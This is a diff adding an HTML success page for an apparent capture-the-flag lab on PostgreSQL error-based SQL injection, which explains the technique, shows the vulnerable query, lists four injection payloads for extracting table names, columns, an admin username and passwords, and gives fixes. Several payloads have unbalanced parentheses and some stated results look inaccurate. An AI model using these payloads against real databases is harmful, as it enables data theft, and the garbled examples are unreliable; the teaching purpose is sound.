@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flag Retrieved | ProductHub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 700px;
+            width: 100%;
+        }
+
+        .flag-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 50px 40px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #10b981, #059669);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 40px;
+        }
+
+        .flag-card h1 {
+            font-size: 32px;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, #10b981, #059669);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .flag-container {
+            background: rgba(16, 185, 129, 0.1);
+            border: 2px solid rgba(16, 185, 129, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .flag-label {
+            color: #10b981;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .flag-value {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            color: #fff;
+            word-break: break-all;
+            font-weight: bold;
+            text-shadow: 0 0 20px rgba(16, 185, 129, 0.5);
+        }
+
+        .explanation {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 20px;
+            text-align: left;
+            margin-bottom: 25px;
+        }
+
+        .explanation h3 {
+            color: #10b981;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .explanation p {
+            color: #94a3b8;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .explanation code {
+            background: rgba(16, 185, 129, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: #fbbf24;
+            font-family: 'Courier New', monospace;
+        }
+
+        .techniques {
+            background: rgba(99, 102, 241, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .techniques h3 {
+            color: #10b981;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+
+        .techniques pre {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+        }
+
+        .techniques code {
+            color: #fbbf24;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+
+        .btn-home {
+            display: inline-block;
+            padding: 12px 30px;
+            background: linear-gradient(90deg, #10b981, #059669);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight:  600;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="flag-card">
+            <div class="success-icon">🎯</div>
+            <h1>Flag Retrieved!</h1>
+            <p style="color: #94a3b8; margin-bottom: 30px;">Congratulations {{ username }}! You have successfully exploited the PostgreSQL error-based SQL injection vulnerability.</p>
+
+            <div class="flag-container">
+                <div class="flag-label">Your Flag</div>
+                <div class="flag-value">{{ flag }}</div>
+            </div>
+
+            <div class="explanation">
+                <h3>Understanding PostgreSQL Error-Based SQL Injection</h3>
+                <p><strong>Vulnerability Type:</strong> Error-Based SQL Injection (Type Casting & Syntax Leakage)</p>
+                <p><strong>How It Works:</strong> PostgreSQL error messages reveal database structure, column types, and query syntax. By triggering intentional errors, you can extract sensitive data.</p>
+
+                <p style="margin-top: 15px;"><strong>The Vulnerable Query:</strong></p>
+                <pre style="background: rgba(16, 185, 129, 0.1); padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; color: #fbbf24; overflow-x: auto;">SELECT * FROM products WHERE id = '{input}'</pre>
+
+                <p style="margin-top: 10px;"><strong>Detection Method:</strong></p>
+                <p>1. Submitting queries that cause type errors</p>
+                <p>2. Analyzing error messages for leaked information</p>
+                <p>3. Using type casting to extract data character by character</p>
+            </div>
+
+            <div class="techniques">
+                <h3>PostgreSQL Error-Based Techniques</h3>
+
+                <p style="color: #94a3b8; margin-bottom: 15px;"><strong>1. Table Name Extraction</strong></p>
+                <pre><code>1' AND (SELECT tablename FROM pg_tables) LIMIT 1 OFFSET 0) > 0--
+Result: Shows 'ERROR: operator does not exist: <column_name>'</code></pre>
+
+                <p style="color: #94a3b8;">This reveals all table names as errors, showing which tables exist.</p>
+
+                <p style="color: #94a3b8; margin-top: 15px;"><strong>2. Column Name Extraction</strong></p>
+                <pre><code>1' AND CAST((SELECT column_name::text FROM information_schema.columns WHERE table_name='products' LIMIT 1 OFFSET 0) > 0--
+Result: Shows "ERROR: type "text" is not unique" or shows column list</code></pre>
+
+                <p style="color: #94a3b8;">This reveals the column structure of the products table.</p>
+
+                <p style="color: #94a3b8; margin-top: 15px;"><strong>3. Data Extraction with CAST</strong></p>
+                <pre><code>1' AND CAST((SELECT username FROM secret_admin WHERE username='admin') AS int) > 0--
+Result: If admin exists, returns admin username as integer</code></pre>
+
+                <p style="color: #94a3b8;">Shows the username (converted to integer for extraction).</p>
+
+                <p style="color: #94a3b8; margin-top: 15px;"><strong>4. Password Extraction Character-by-Character</strong></p>
+                <pre><code>1' AND (SELECT SUBSTR(password::text, 1, 1)='a')::text) > 0--
+Result: If first character is 'a', returns first product</code></pre>
+
+                <p style="color: #94a3b8;">This tests each character position systematically.</p>
+            </div>
+
+            <div class="explanation">
+                <h3>How to Fix This Vulnerability</h3>
+                <p><strong>1. Use Parameterized Queries:</strong></p>
+                <pre style="background: rgba(16, 185, 129, 0.1); padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; color: #fbbf24; overflow-x: auto;">cursor.execute("SELECT * FROM products WHERE id = %s", (product_id,))</pre>
+
+                <p style="margin-top: 10px;"><strong>2. Disable Verbose Error Messages:</strong></p>
+                <p>Log errors server-side, show generic messages to users.</p>
+
+                <p style="margin-top: 10px;"><strong>3. Input Validation:</strong></p>
+                <p>Validate that ID is numeric before using in query.</p>
+
+                <p style="margin-top: 10px;"><strong>4. Use ORM Frameworks:</strong></p>
+                <p>SQLAlchemy, Django ORM handle escaping automatically.</p>
+            </div>
+
+            <div style="margin-top: 30px;">
+                <a href="/" class="btn-home">Return Home</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
